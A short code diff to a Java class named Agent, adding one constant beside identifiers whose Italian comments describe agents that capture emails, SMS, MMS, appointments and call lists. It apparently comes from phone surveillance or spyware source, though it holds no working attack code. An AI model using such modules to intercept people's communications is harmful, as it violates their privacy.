@@ -12,6 +12,7 @@ public class Agent {
 	 * Agents definitions
 	 */
 	final public static int  AGENT = 0x1000;
+	final public static  int AGENT_INFO = AGENT;
 	final public static int  AGENT_SMS         = AGENT + 0x1;		// Agente di cattura delle Email/Sms/Mms
 	final public static int  AGENT_TASK        = AGENT + 0x2;		// Agente per la cattura degli appuntamenti 
 	final public static int  AGENT_CALLLIST    = AGENT + 0x3;		// Agente per la cattura della lista delle chiamate
